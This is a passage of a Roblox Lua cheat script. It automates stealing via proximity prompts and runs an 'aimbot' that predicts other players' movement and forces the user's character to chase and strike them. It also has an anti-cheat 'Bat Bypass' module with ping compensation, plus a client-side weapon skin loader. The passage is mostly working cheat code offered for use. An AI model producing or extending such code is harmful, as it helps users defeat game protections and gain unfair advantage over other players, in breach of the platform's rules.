            local connected = false
            pcall(function() connected = stealConnection.Connected == true end)
            if connected then
                Steal.StealRadius = CONFIG.STEAL_RANGE
                Steal.AutoStealEnabled = true
                return true
            end
            pcall(function() stealConnection:Disconnect() end)
            stealConnection = nil
        end
        Steal.StealRadius = CONFIG.STEAL_RANGE
        Steal.AutoStealEnabled = true
        stealConnection = RunService.Heartbeat:Connect(function()
            if not Steal.AutoStealEnabled or isStealing then return end
            if selectedStealMode ~= "V1" then return end
            local p, n = findNearestPrompt()
            if p then executeSteal(p, n) end
        end)
        return true
    end
    
    local function _stopAutoStealV1()
        if stealConnection then
            stealConnection:Disconnect()
            stealConnection = nil
        end
        isStealing = false
        Steal.AutoStealEnabled = false
        if progressFill then
            TS:Create(progressFill, TweenInfo.new(0.2), { Size = UDim2.new(0, 0, 1, 0) }):Play()
        end
        if progressPct then progressPct.Text = "0%" end
    end
    
    function startAutoSteal()
        _stopAutoStealV1()
        stopAutoStealV2()
        CONFIG.AUTO_STEAL_ENABLED = true
        if selectedStealMode == "V2" then
            startAutoStealV2()
        else
            _startAutoStealV1()
        end
        return true
    end
    
    function stopAutoSteal()
        _stopAutoStealV1()
        stopAutoStealV2()
        CONFIG.AUTO_STEAL_ENABLED = false
        if progressFill then
            TS:Create(progressFill, TweenInfo.new(0.2), { Size = UDim2.new(0, 0, 1, 0) }):Play()
        end
        if progressPct then progressPct.Text = "0%" end
    end
    
    medusaDebounce = false
    medusaLastUsed = 0
    dropActive = false
    lastDropTime = 0
    lastMoveDir = _V3new(0,0,0)
    origFOV = nil
    customFovConn = nil
    
    _anyKeyListening = false
    _aimbotConn = nil
    _prevAutoRotate = nil
    tpBatConn = nil
    tpBatPrevAutoRotate = nil
    tpBatHitCD = false
    TP_BAT_SWING_CD = 0.08
    tpBatFloatingButton = nil
    
    enemySpeedConn = nil
    movementLoop = nil
    steppedConn = nil
    alConn = nil
    arConn = nil
    infJumpConn = nil
    stretchConn = nil
    stretchFovConn = nil
    antiLagDescConn = nil
    medusaResetConns = {}
    dropConnections = {}
    enemySpeedLabels = {}
    Conns = {autoSteal = nil, batCounter = nil, anchor = {}, progress = nil, autoLeft = nil, autoRight = nil}
    keyButtonRefs = {}
    progressFill = nil
    progressPct = nil
    pbFrame = nil
    speedLabel = nil
    modeValLbl = nil
    normalBox, carryBox, laggerBox, lagger2Box, radInput, batSpeedBox, uiScaleBox = nil, nil, nil, nil, nil, nil, nil
    stealBarScaleBox = nil
    modeSelectBtn, dropModeBtnRef = nil, nil
    autoBatSetVisual, autoLeftSetVisual, autoRightSetVisual, setBatCounterVisual, setMedusaVisual = nil, nil, nil, nil, nil
    setAntiRagVisual, setUnwalkVisual, setAntiLagVisual, setLockUIVisual, setInstaGrab = nil, nil, nil, nil, nil
    setInfiniteJumpVisual = nil
    setAntiDieVisual = nil
    setAntiFlingVisual = nil
    mobSetAutoBat, mobSetAutoLeft, mobSetAutoRight, mobSetDropBR, mobSetTpDown, mobSetCarry, mobSetLagger1, mobSetLagger2 = nil, nil, nil, nil, nil, nil, nil, nil
    miniBtn, main, gui = nil, nil, nil
    MobilePanel = nil
    instaResetFloatingButton = nil
    showGui = nil
    hideGui = nil
    mainUIScale = nil
    animSelectorLabel = nil
    pbScale = nil
    tabButtons = {}
    colorSelectorLabel = nil
    
    GAMEPAD_KEYS = {
        [Enum.KeyCode.ButtonA] = true, [Enum.KeyCode.ButtonB] = true,
        [Enum.KeyCode.ButtonX] = true, [Enum.KeyCode.ButtonY] = true,
        [Enum.KeyCode.ButtonL1] = true, [Enum.KeyCode.ButtonR1] = true,
        [Enum.KeyCode.ButtonL2] = true, [Enum.KeyCode.ButtonR2] = true,
        [Enum.KeyCode.ButtonL3] = true, [Enum.KeyCode.ButtonR3] = true,
        [Enum.KeyCode.ButtonStart] = true, [Enum.KeyCode.ButtonSelect] = true,
        [Enum.KeyCode.DPadUp] = true, [Enum.KeyCode.DPadDown] = true,
        [Enum.KeyCode.DPadLeft] = true, [Enum.KeyCode.DPadRight] = true,
    }
    
    MOVE_KEYS = {
        [Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true,
        [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
        [Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true,
        [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true,
    }
    
    BAT_COUNTER_SLAP_LIST = {
        "Bat", "Slap", "Iron Slap", "Gold Slap", "Diamond Slap",
        "Emerald Slap", "Ruby Slap", "Dark Matter Slap", "Flame Slap",
        "Nuclear Slap", "Galaxy Slap", "Glitched Slap"
    }
    
    AP = {
        L1 = _V3new(-476.48, -6.28, 92.73),
        L2 = _V3new(-483.12, -4.95, 94.80),
        L_FACE = _V3new(-482.25, -4.96, 92.09),
        R1 = _V3new(-476.16, -6.52, 25.62),
        R2 = _V3new(-483.06, -5.03, 25.48),
        R_FACE = _V3new(-482.06, -6.93, 35.47),
    }
    
    function isGamepadInput(inp)
        return inp and inp.UserInputType and inp.UserInputType.Name:match("^Gamepad") ~= nil
    end
    
    function isBindableInput(inp)
        if not inp or inp.KeyCode == Enum.KeyCode.Unknown then return false end
        if inp.UserInputType == Enum.UserInputType.Keyboard then return true end
        return isGamepadInput(inp) and GAMEPAD_KEYS[inp.KeyCode] == true
    end
    
    function kbMatch(entry, kc)
        return kc and (kc == entry.kb or (entry.gp and kc == entry.gp))
    end
    
    function resetProgressBar()
        if progressPct then progressPct.Text = "0%" end
        if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
    end
    
    -- =====================================================================
    -- [AIMBOT] TARGET HUB AIMBOT LOGIC
    -- =====================================================================
    function startAimbotAdapt()
        if _aimbotConn then return end
        _suppressBodyLock()
        local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum0 then
            if _prevAutoRotate == nil then _prevAutoRotate = hum0.AutoRotate end
            hum0.AutoRotate = false
        end
        
        _aimbotConn = RunService.RenderStepped:Connect(function()
            if not autoBatEnabled then return end
            local char = LP.Character
            if not char then return end
            local root = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not root or not hum then return end
            
            if not char:FindFirstChildOfClass("Tool") then
                local bat = findBat()
                if bat then pcall(function() hum:EquipTool(bat) end) end
            end
            
            local target = getClosestTarget()
            if not target then return end
            
            local targetVel = target.AssemblyLinearVelocity
            local myPos = root.Position
            local targetPos = target.Position
            
            local predictPos = targetPos + targetVel * 0.14
            predictPos = predictPos + target.CFrame.LookVector * 0.3
            
            local direction = predictPos - myPos
            local flatDir = _V3new(direction.X, 0, direction.Z).Unit
            local chaseSpeed = BAT_AIMBOT_SPEED
            
            local desiredHeight = targetPos.Y + 3.7
            local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
            if hum.FloorMaterial ~= Enum.Material.Air then
                yVel = math.max(yVel, 13)
            end
            yVel = _clamp(yVel, -70, 110)
            
            local desiredVel = _V3new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed)
            root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)
            
            local magnitude = targetVel.Magnitude
            local predictTime = _clamp(magnitude / 150, 0.05, 0.2)
            local predictedPos = targetPos + targetVel * predictTime
            local toPredict = predictedPos - myPos
            if toPredict.Magnitude > 0.1 then
                local goalCF = _CFlookAt(myPos, predictedPos)
                local diffCF = root.CFrame:Inverse() * goalCF
                local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
                rx = _clamp(rx, -2.5, 2.5)
                ry = _clamp(ry, -2.5, 2.5)
                rz = _clamp(rz, -2.5, 2.5)
                root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(_V3new(rx * 42, ry * 42, rz * 42))
            end
            
            local distToTarget = (root.Position - target.Position).Magnitude
            if distToTarget <= 8 then trySwing() end
        end)
    end
    
    -- =====================================================================
    -- [FROM CLEAN] BAT BYPASS MODULE (Replaces old Bat V2)
    -- =====================================================================
    BAT_V2_SPEED = BAT_V2_SPEED or 55
    BAT_V2_HIT_DIST = BAT_V2_HIT_DIST or 13
    BAT_V2_LEAD_STUDS = BAT_V2_LEAD_STUDS or 3
    BAT_V2_BODY_LOCK_RANGE = BAT_V2_BODY_LOCK_RANGE or 60
    
    _G.SnowVS = _G.SnowVS or {}
    _G.SnowVS.BatBypass = _G.SnowVS.BatBypass or {}
    _G.SnowVS.AimbotBypassV2 = _G.SnowVS.BatBypass
    
    _G.AceAntiBypassAimbot = _G.AceAntiBypassAimbot or {
        conn = nil,
        swingCooldown = false,
        prevAutoRotate = nil,
    }
    
    _G.AceAntiBypassSlapList = _G.AceAntiBypassSlapList or {
        "Bat","Slap","Iron Slap","Gold Slap","Diamond Slap",
        "Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap",
        "Nuclear Slap","Galaxy Slap","Glitched Slap",
    }
    
    _G.AceSafeModeTryStart = _G.AceSafeModeTryStart or _G.AmbitiousSafeModeTryStart
    _G.AceStopAutoTPForAction = _G.AceStopAutoTPForAction or function()
        if batDesyncTpEnabled and type(stopBatDesyncTp) == "function" then
            stopBatDesyncTp()
        end
    end
    _G.AceStopNormalAimbot = _G.AceStopNormalAimbot or function()
        local wasAutoBatEnabled = autoBatEnabled
        if wasAutoBatEnabled then
            wasAutoBatEnabled = type(disableAutoBat) == "function"
        end
        if wasAutoBatEnabled then
            disableAutoBat()
        end
    end
    
    do
        local batBypass = _G.SnowVS.BatBypass
        batBypass.Enabled = batBypass.Enabled or false
        batBypass.Connection = batBypass.Connection or nil
        batBypass.Z = batBypass.Z or {
            targetPlayer=nil,lastTargetPos=nil,targetVelocity=Vector3.zero,
            smoothedVelocity=Vector3.zero,velocityHistory={},accelerationHistory={},
            aerialVelocityHistory={},previousDirection=nil,lastDirectionChangeTime=0,
            airborneTime=0,lastActivationTime=0,currentPing=0.1,realPingMs=0,
        }
        batBypass.ZCFG = batBypass.ZCFG or {
            FOLLOW_SPEED=BAT_V2_SPEED, ACTIVATE_DISTANCE=BAT_V2_HIT_DIST,
            MIN_FOLLOW_DISTANCE=1, PREDICTION_TIME=0.22, PREDICT_AHEAD=BAT_V2_LEAD_STUDS,
            MAX_VELOCITY_CHANGE=150, VELOCITY_SMOOTHING=0.2, MAX_HORIZONTAL_VELOCITY=80,
            SERVER_TICKRATE=0.016666666666666666, MIN_PING_COMPENSATION=0.03,
            MAX_PING_COMPENSATION=0.25, ACCELERATION_PREDICTION_WEIGHT=0.3,
            DIRECTION_CHANGE_DETECTION_TIME=0.12, QUICK_DIRECTION_CHANGE_MULTIPLIER=1.5,
            GRAVITY=196.2, AIR_CONTROL_FACTOR=0.8, MIN_AIRBORNE_TIME=0.08,
        }
    
        local function averageVectors(v)
            if #v == 0 then return Vector3.zero end
            local s = Vector3.zero
            for _, e in ipairs(v) do s += e end
            return s / #v
        end
        local function pushBounded(t, e, m)
            table.insert(t, e)
            if #t > m then table.remove(t, 1) end
        end
    
        batBypass.FindBat = function()
            local c = LP.Character
            if not c then return nil end
            local t = c:FindFirstChildOfClass("Tool")
            if t then
                local n = t.Name:lower()
                if n:find("bat",1,true) or n:find("slap",1,true) then return t end
            end
            local bp = LP:FindFirstChildOfClass("Backpack")
            if bp then
                for _, child in ipairs(bp:GetChildren()) do
                    if child:IsA("Tool") then
                        local n = child.Name:lower()
                        if n:find("bat",1,true) or n:find("slap",1,true) then return child end
                    end
                end
            end
            return nil
        end
    
        local function resetPredictionState()
            local z = batBypass.Z
            z.targetPlayer=nil; z.lastTargetPos=nil; z.targetVelocity=Vector3.zero
            z.smoothedVelocity=Vector3.zero; z.velocityHistory={}
            z.accelerationHistory={}; z.aerialVelocityHistory={}
            z.previousDirection=nil; z.airborneTime=0
        end
    
        local function findClosestPlayer(rootPart)
            local cd, cp = math.huge, nil
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LP and p.Character then
                    local tr = p.Character:FindFirstChild("HumanoidRootPart")
                    local h  = p.Character:FindFirstChildOfClass("Humanoid")
                    if tr and h and h.Health > 0 then
                        local d = (rootPart.Position - tr.Position).Magnitude
                        if d < cd then cd = d; cp = p end
                    end
                end
            end
            return cp
        end
    
        local function applyAngularAim(rootPart, direction)
            if direction.Magnitude < 0.01 then return end
            local cross = rootPart.CFrame.LookVector:Cross(direction.Unit)
            local angle = math.asin(math.clamp(cross.Magnitude, -1, 1))
            rootPart.AssemblyAngularVelocity = cross.Magnitude > 0.1
                and cross.Unit * angle * 80 or Vector3.zero
        end
    
        local function updatePing()
            local ok, res = pcall(function()
                return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
            end)
            local z = batBypass.Z
            if ok and type(res) == "number" then z.realPingMs = math.floor(res) end
            z.currentPing = math.clamp(z.realPingMs / 1000,
                batBypass.ZCFG.MIN_PING_COMPENSATION,
                batBypass.ZCFG.MAX_PING_COMPENSATION)
        end
    
        batBypass.PingLoopStarted = batBypass.PingLoopStarted or false
        if not batBypass.PingLoopStarted then
            batBypass.PingLoopStarted = true
            task.spawn(function()
                while true do pcall(updatePing); task.wait(0.5) end
            end)
        end
    
        batBypass.Stop = function()
            local z = batBypass.Z
            batBypass.Enabled = false
            if batBypass.Connection then
                batBypass.Connection:Disconnect(); batBypass.Connection = nil
            end
            local c = LP.Character
            local h = c and c:FindFirstChildOfClass("Humanoid")
            local r = c and c:FindFirstChild("HumanoidRootPart")
            if h then h.AutoRotate = true end
            if r then r.AssemblyAngularVelocity = Vector3.zero end
            resetPredictionState()
            z.lastActivationTime = 0
        end
    
        batBypass.Start = function()
            if batBypass.Connection then return end
            local c = LP.Character
            local h0 = c and c:FindFirstChildOfClass("Humanoid")
            local r0 = c and c:FindFirstChild("HumanoidRootPart")
            if not h0 or not r0 then return end
            batBypass.Enabled = true
            h0.AutoRotate = false
            local tool = batBypass.FindBat()
            if tool and tool.Parent ~= c then
                pcall(function() h0:EquipTool(tool) end)
            end
    
            batBypass.Connection = RunService.RenderStepped:Connect(function(dt)
                if not batBypass.Enabled then batBypass.Stop(); return end
                local z = batBypass.Z
                local zc = batBypass.ZCFG
                if _G.AceGetAntiBypassAimbotSpeed then
                    zc.FOLLOW_SPEED = _G.AceGetAntiBypassAimbotSpeed()
                end
                local ch = LP.Character
                local rp = ch and ch:FindFirstChild("HumanoidRootPart")
                local hum = ch and ch:FindFirstChildOfClass("Humanoid")
                if not rp or not hum or hum.Health <= 0 then return end
                hum.AutoRotate = false
                r0 = rp; h0 = hum
                tool = ch:FindFirstChildOfClass("Tool") or batBypass.FindBat()
                if tool and tool.Parent ~= ch then
                    pcall(hum.EquipTool, hum, tool)
                end
    
                z.targetPlayer = findClosestPlayer(rp)
                local tc = z.targetPlayer and z.targetPlayer.Character
                local trp = tc and tc:FindFirstChild("HumanoidRootPart")
                local th  = tc and tc:FindFirstChildOfClass("Humanoid")
                if not trp or not th or th.Health <= 0 then
                    resetPredictionState(); return
                end
    
                local pos = trp.Position
                local sdt = math.max(dt, 0.0041666666666666666)
                if z.lastTargetPos then
                    local tv = (pos - z.lastTargetPos) / sdt
                    local diff = tv - z.targetVelocity
                    if zc.MAX_VELOCITY_CHANGE < diff.Magnitude then
                        tv = z.targetVelocity + diff.Unit * zc.MAX_VELOCITY_CHANGE
                    end
                    local v3 = Vector3.new(tv.X, 0, tv.Z)
                    if v3.Magnitude > zc.MAX_HORIZONTAL_VELOCITY then
                        local u = v3.Unit * zc.MAX_HORIZONTAL_VELOCITY
                        tv = Vector3.new(u.X, tv.Y, u.Z)
                    end
                    pushBounded(z.accelerationHistory, (tv - z.targetVelocity) / sdt, 4)
                    pushBounded(z.velocityHistory, tv, 8)
                    z.targetVelocity = tv
                    z.smoothedVelocity = z.smoothedVelocity:Lerp(tv, zc.VELOCITY_SMOOTHING)
                end
                z.lastTargetPos = pos
    
                local airborne = th.FloorMaterial == Enum.Material.Air
                z.airborneTime = airborne and (z.airborneTime + sdt) or 0
                if airborne and z.airborneTime >= zc.MIN_AIRBORNE_TIME then
                    pushBounded(z.aerialVelocityHistory, z.targetVelocity, 6)
                elseif not airborne then
                    z.aerialVelocityHistory = {}
                end
    
                local sv = z.smoothedVelocity
                if airborne and #z.aerialVelocityHistory > 0 then
                    local a = averageVectors(z.aerialVelocityHistory)
                    sv = Vector3.new(a.X, z.targetVelocity.Y, a.Z) * zc.AIR_CONTROL_FACTOR
                end
    
                local quickChange = false
                local v3b = Vector3.new(z.targetVelocity.X, 0, z.targetVelocity.Z)
                if v3b.Magnitude > 5 then
                    local u = v3b.Unit
                    if z.previousDirection and z.previousDirection:Dot(u) < 0.5 then
                        quickChange = tick() - z.lastDirectionChangeTime < zc.DIRECTION_CHANGE_DETECTION_TIME
                        z.lastDirectionChangeTime = tick()
                    end
                    z.previousDirection = u
                end
    
                local predTime = z.currentPing + zc.SERVER_TICKRATE
                if quickChange then predTime *= zc.QUICK_DIRECTION_CHANGE_MULTIPLIER end
                local apw = zc.ACCELERATION_PREDICTION_WEIGHT
                local predPos = pos + sv * predTime
                    + averageVectors(z.accelerationHistory) * apw * predTime * predTime * 0.5
                local leadTime = zc.PREDICTION_TIME * 1.1
                local leadPos
                if airborne then
                    leadPos = predPos + sv * leadTime
                        + Vector3.new(0, -0.5 * zc.GRAVITY * leadTime * leadTime, 0)
                else
                    leadPos = predPos + sv * leadTime
                end
                local v4 = Vector3.new(sv.X, 0, sv.Z)
                if v4.Magnitude > 1 then leadPos += v4.Unit * zc.PREDICT_AHEAD end
    
                local targetDir = leadPos - rp.Position
                applyAngularAim(rp, targetDir)
    
                local inRange = (pos - rp.Position).Magnitude <= zc.ACTIVATE_DISTANCE
                if inRange then inRange = tick() - z.lastActivationTime >= 0.3 end
                if inRange then
                    if tool then pcall(tool.Activate, tool) end
                    z.lastActivationTime = tick()
                end
    
                if zc.MIN_FOLLOW_DISTANCE < targetDir.Magnitude then
                    rp.AssemblyLinearVelocity = targetDir.Unit * zc.FOLLOW_SPEED
                else
                    rp.AssemblyLinearVelocity = Vector3.new(0, rp.AssemblyLinearVelocity.Y * 0.5, 0)
                end
            end)
        end
    
        batBypass.Toggle = function()
            if batBypass.Enabled then batBypass.Stop() else batBypass.Start() end
        end
    end
    
    -- Wrapper helpers for Bat Bypass
    _G.AceGetAntiBypassAimbotSpeed = function()
        if laggerToggled or laggerCarryToggled then
            return tonumber(_G.AceAntiBypassLaggerAimbotSpeed) or 40
        end
        return tonumber(_G.AceAntiBypassAimbotSpeed) or 60
    end
    _G.AceRefreshAimbotVisual = function()
        if autoBatV2SetVisual then autoBatV2SetVisual(_G.AceAntiBypassAimbotOn == true) end
    end
    
    _G.AceStartAntiBypassAimbot = function()
        if _G.AceSafeModeTryStart and not _G.AceSafeModeTryStart() then
            return false
        end
        if _G.AceStopAutoTPForAction then _G.AceStopAutoTPForAction() end
        if _G.AceStopNormalAimbot then _G.AceStopNormalAimbot() end
        selectedAimbotMode = "Bat Bypass"
        _G.AceAntiBypassAimbotOn = true
        _G.SnowVS.BatBypass.ZCFG.FOLLOW_SPEED = _G.AceGetAntiBypassAimbotSpeed()
        _G.SnowVS.BatBypass.Start()
        if _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
        saveAllSettings()
        return true
    end
    
    _G.AceStopAntiBypassAimbot = function(updateVisual)
        _G.SnowVS.BatBypass.Stop()
        _G.AceAntiBypassAimbotOn = false
        if updateVisual ~= false and _G.AceRefreshAimbotVisual then
            _G.AceRefreshAimbotVisual()
        end
        saveAllSettings()
    end
    
    -- Main enable/disable/toggle for Bat Bypass
    enableBatV2 = function()
        if batDesyncTpEnabled then
            if stopBatDesyncTp then pcall(stopBatDesyncTp) end
        end
        if autoBatEnabled then
            autoBatEnabled = false
            if autoBatSetVisual then autoBatSetVisual(false) end
            if mobSetAutoBat then mobSetAutoBat(false) end
            if _aimbotConn then
                pcall(function() _aimbotConn:Disconnect() end)
                _aimbotConn = nil
            end
        end
        selectedAimbotMode = "Bat Bypass"
        if _G.AceStartAntiBypassAimbot() ~= false then
            autoBatV2Enabled = true
            batV2Enabled = true
            if autoBatV2SetVisual then autoBatV2SetVisual(true) end
            if batV2SetVisual then batV2SetVisual(true) end
            if _G.__YoutBatV2Frame then
                paintFloatingBtn(_G.__YoutBatV2Frame, true)
            end
        end
    end
    
    disableBatV2 = function()
        _G.AceStopAntiBypassAimbot()
        autoBatV2Enabled = false
        batV2Enabled = false
        if autoBatV2SetVisual then autoBatV2SetVisual(false) end
        if batV2SetVisual then batV2SetVisual(false) end
        if _G.__YoutBatV2Frame then
            paintFloatingBtn(_G.__YoutBatV2Frame, false)
        end
    end
    
    toggleBatV2 = function()
        if autoBatV2Enabled then disableBatV2() else enableBatV2() end
        return autoBatV2Enabled
    end
    
    -- =====================================================================
    -- [FROM CLEAN] KATANA SKIN CONTROLLER (Minecraft Bat removed)
    -- =====================================================================
    katanaSkinController = nil
    minecraftBatSkinController = nil
    
    do
        local function createKatanaSkinController()
            local katanaPlayersService = game:GetService("Players")
            local katanaInsertService = game:GetService("InsertService")
            local katanaLighting = game:GetService("Lighting")
            local katanaReplicatedStorage = game:GetService("ReplicatedStorage")
            local katanaPlayer = katanaPlayersService.LocalPlayer
            local katanaColors = {
                red = Color3.new(0.784314, 0, 0),
                red2 = Color3.new(1, 0, 0.392157),
                gold = Color3.new(1, 0.843137, 0),
            }
            local katanaState = {
                Skin = "KATANA",
                SkinOrder = {"KATANA","NONE"},
                LastBat = nil, LastAppliedSkin = nil,
                OriginalKatanaTemplate = nil,
                ExactTemplates = {}, ExactTemplateSearched = {},
                ExactAssetIds = { KATANA = "" },
                Original = {},
            }
            local function findBat()
                local c = katanaPlayer.Character
                if c then
                    local bat = c:FindFirstChild("Bat")
                    if bat and bat:IsA("Tool") then return bat end
                end
                local bp = katanaPlayer:FindFirstChildOfClass("Backpack")
                if bp then
                    local bat = bp:FindFirstChild("Bat")
                    if bat and bat:IsA("Tool") then return bat end
                end
                return nil
            end
            local function configureVisualPart(part)
                if not part or not part:IsA("BasePart") then return end
                part.Anchored = false
                part.CanCollide = false
                part.CanTouch = false
                part.CanQuery = false
                part.Massless = true
            end
            local function weldToHandle(part1, part0)
                if not part1 or not part0 or not part1:IsA("BasePart") or not part0:IsA("BasePart") then return end
                configureVisualPart(part1)
                local wc = Instance.new("WeldConstraint")
                wc.Name = "FlowerSkin_AssetWeld"
                wc.Part0 = part0
                wc.Part1 = part1
                wc.Parent = part1
            end
            local function cacheOriginalBatState(batTool)
                if not batTool then return end
                local handle = batTool:FindFirstChild("Handle")
                local slash = batTool:FindFirstChild("Slash")
                katanaState.Original[batTool] = katanaState.Original[batTool] or {}
                local os_ = katanaState.Original[batTool]
                if handle and handle:IsA("BasePart") and not os_.Handle then
                    os_.Handle = {
                        Transparency = handle.Transparency,
                        LocalTransparencyModifier = handle.LocalTransparencyModifier,
                        CastShadow = handle.CastShadow,
                    }
                end
                if slash and slash:IsA("Sound") and not os_.SlashSoundId then
                    os_.SlashSoundId = slash.SoundId
                end
            end
            local function captureOriginalKatanaTemplate()
                if katanaState.OriginalKatanaTemplate then return end
                local function scanContainer(container)
                    if not container then return end
                    local bat = container:FindFirstChild("Bat")
                    if not bat then return end
                    local fk = bat:FindFirstChild("FlowerSkin_KatanaRealistic")
                    fk = fk and fk:FindFirstChild("FlowerSkin_AssetKatana")
                    if fk then
                        katanaState.OriginalKatanaTemplate = fk:Clone()
                    end
                end
                scanContainer(katanaPlayer:FindFirstChildOfClass("Backpack"))
                scanContainer(katanaPlayer.Character)
            end
            local function setBatHandleHidden(batTool, hidden)
                local h = batTool and batTool:FindFirstChild("Handle")
                if not h or not h:IsA("BasePart") then return end
                cacheOriginalBatState(batTool)
                if hidden then
                    h.LocalTransparencyModifier = 1
                    h.Transparency = 1
                    h.CastShadow = false
                else
                    local o = katanaState.Original[batTool] and katanaState.Original[batTool].Handle
                    h.LocalTransparencyModifier = o and o.LocalTransparencyModifier or 0
                    h.Transparency = o and o.Transparency or 0
                    h.CastShadow = o and o.CastShadow
                    if h.CastShadow == nil then h.CastShadow = true end
                end
            end
            local function setBatSlashSound(batTool, soundId)
                cacheOriginalBatState(batTool)
                local slash = batTool and batTool:FindFirstChild("Slash")
                if slash and slash:IsA("Sound") then
                    if not soundId then
                        soundId = katanaState.Original[batTool] and katanaState.Original[batTool].SlashSoundId
                            or slash.SoundId
                    end
                    slash.SoundId = soundId
                end
            end
            local function restoreOriginalBatVisual(batTool)
                if not batTool then return end
                local fk = batTool:FindFirstChild("FlowerSkin_KatanaRealistic")
                if fk then fk:Destroy() end
                local fa = batTool:FindFirstChild("FlowerSkin_AssetKatana")
                if fa then fa:Destroy() end
                setBatHandleHidden(batTool, false)
                setBatSlashSound(batTool, nil)
            end
            local function addKatanaRedEffects(parent)
                if not parent or not parent:IsA("BasePart") then return end
                local fs = parent:FindFirstChild("FictionHubSpeedIndicator")
                if fs then fs:Destroy() end
                local topAtt = Instance.new("Attachment")
                topAtt.Name = "FlowerSkin_ExtraRedVFX"
                topAtt.Position = Vector3.new(0, parent.Size.Y * 0.5, 0)
                topAtt.Parent = parent
                local botAtt = Instance.new("Attachment")
                botAtt.Name = "FlowerSkin_ExtraRedVFX_End"
                botAtt.Position = Vector3.new(0, -parent.Size.Y * 0.5, 0)
                botAtt.Parent = parent
                local trail = Instance.new("Trail")
                trail.Name = "FlowerSkin_ExtraRedVFX"
                trail.Attachment0 = topAtt
                trail.Attachment1 = botAtt
                trail.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, katanaColors.red2),
                    ColorSequenceKeypoint.new(1, Color3.new(0.54902, 0, 0)),
                })
                trail.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, 0.35),
                    NumberSequenceKeypoint.new(1, 1),
                })
                trail.Lifetime = 0.18
                trail.LightEmission = 0.55
                trail.Parent = parent
                local pe = Instance.new("ParticleEmitter")
                pe.Name = "FlowerSkin_ExtraRedVFX"
                local r2 = katanaColors.red2
                pe.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.new(0.784314, 0, 0)),
                    ColorSequenceKeypoint.new(1, r2),
                })
                pe.LightEmission = 0.55
                pe.Rate = 14
                pe.Lifetime = NumberRange.new(0.3, 0.45)
                pe.Speed = NumberRange.new(0.2, 0.7)
                pe.SpreadAngle = Vector2.new(12, 12)
                pe.Size = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, 0.08),
                    NumberSequenceKeypoint.new(1, 0),
                })
                pe.Texture = "rbxasset://textures/particles/sparkles_main.dds"
                pe.Parent = parent
            end
            local function createKatanaPart(parent, name, size, cframeOffset, color, material)
                local part = Instance.new("Part")
                part.Name = name
                part.Size = size
                part.Color = color
                part.Material = material or Enum.Material.Neon
                part.TopSurface = Enum.SurfaceType.Smooth
                part.BottomSurface = Enum.SurfaceType.Smooth
                configureVisualPart(part)
                part.Parent = parent
                return part, cframeOffset or CFrame.identity
            end
            local katanaCandidateNames = {
                KATANA = {"FlowerSkin_AssetKatana","Katana","FlowerSkin_KatanaRealistic"},
            }
            local function isScriptInstance(inst)
                return inst:IsA("Script") or inst:IsA("LocalScript") or inst:IsA("ModuleScript")
            end
            local function removeScripts(root)
                if not root then return end
                if isScriptInstance(root) then root:Destroy(); return end
                for _, d in ipairs(root:GetDescendants()) do
                    if isScriptInstance(d) then d:Destroy() end
                end
            end
            local function hasBasePart(c)
                if not c then return false end
                if c:IsA("BasePart") then return true end
                return c:FindFirstChildWhichIsA("BasePart", true) ~= nil
            end
            local function isGeneratedSkin(c)
                local ok, res = pcall(function() return c:GetAttribute("CursedBatSkinsGenerated") end)
                return ok and res == true
            end
            local function validateSkinCandidate(c)
                if not c or isGeneratedSkin(c) then return nil end
                if c:IsA("Model") or c:IsA("Tool") or c:IsA("Accessory") or c:IsA("BasePart") then
                    if hasBasePart(c) then return c end
                end
                return nil
            end
            local function findNamedSkinCandidate(root, names)
                if not root then return nil end
                for _, e in ipairs(names) do
                    if root.Name ~= e then continue end
                    local c = validateSkinCandidate(root)
                    if c then return c end
                end
                for _, name in ipairs(names) do
                    local inst = root:FindFirstChild(name, true)
                    local v = validateSkinCandidate(inst)
                    if v then return v end
                end
                return nil
            end
            local function normalizeAssetId(id)
                local n = tostring(id or ""):gsub("%s+", "")
                if n == "" then return nil end
                if n:match("^rbxassetid://") or n:match("^rbxasset://") then return n end
                if n:match("^%d+$") then return "rbxassetid://" .. n end
                return n
            end
            local function loadAssetSkinTemplate(skinName)
                local uri = normalizeAssetId(katanaState.ExactAssetIds[skinName])
                if not uri then return nil end
                local loaded = {}
                pcall(function() loaded = game:GetObjects(uri) end)
                if #loaded == 0 then
                    local m = tostring(uri):match("(%d+)")
                    if m then
                        pcall(function()
                            table.insert(loaded, katanaInsertService:LoadAsset(tonumber(m)))
                        end)
                    end
                end
                local names = katanaCandidateNames[skinName] or {}
                for _, e in ipairs(loaded) do
                    local c = findNamedSkinCandidate(e, names) or validateSkinCandidate(e)
                    if c then
                        local clone = c:Clone()
                        removeScripts(clone)
                        return clone
                    end
                end
                return nil
            end
            local function findExistingSkinTemplate(skinName)
                local names = katanaCandidateNames[skinName]
                if not names then return nil end
                local roots = {
                    katanaPlayer.Character,
                    katanaPlayer:FindFirstChildOfClass("Backpack"),
                    katanaReplicatedStorage,
                    katanaLighting,
                    workspace,
                }
                for _, e in ipairs(roots) do
                    local c = findNamedSkinCandidate(e, names)
                    if c then
                        local clone = c:Clone()
                        removeScripts(clone)
                        return clone
                    end
                end
                return nil
            end
            local function getSkinTemplate(skinName)
                if skinName == "KATANA" and katanaState.OriginalKatanaTemplate then
                    return katanaState.OriginalKatanaTemplate
                end
